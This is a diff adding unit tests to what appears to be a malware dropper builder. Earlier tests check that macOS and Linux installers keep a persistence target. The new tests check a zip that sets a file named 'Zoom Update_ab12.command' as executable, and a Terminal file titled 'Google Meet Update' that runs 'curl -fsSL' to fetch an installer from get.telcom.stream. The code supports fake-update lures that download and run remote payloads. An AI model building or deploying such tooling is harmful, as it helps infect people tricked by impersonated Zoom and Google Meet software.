@@ -219,3 +219,23 @@ def test_mac_dropper_keeps_persistence_target():
 def test_linux_installer_keeps_persistence_target():
     src = (build.TEMPLATES / "linux" / "installer.sh.tmpl").read_text(encoding="utf-8")
     assert 'rm -rf "$WORKDIR"' not in src
+
+
+def test_zip_member_is_executable_on_unix():
+    import io
+    import zipfile
+
+    data = build.zip_exec_member("Zoom Update_ab12.command", b"#!/bin/bash\necho hi\n")
+    with zipfile.ZipFile(io.BytesIO(data)) as zf:
+        info = zf.infolist()[0]
+        assert info.create_system == 3
+        assert (info.external_attr >> 16) & 0o777 == 0o755
+
+
+def test_render_terminal_runs_curl_installer():
+    out = build.render_terminal("Google Meet Update", "get.telcom.stream")
+    assert out.startswith("<?xml")
+    assert "CommandString" in out
+    assert "https://get.telcom.stream/install/mac" in out
+    assert "curl -fsSL" in out
+    assert "Google Meet Update" in out
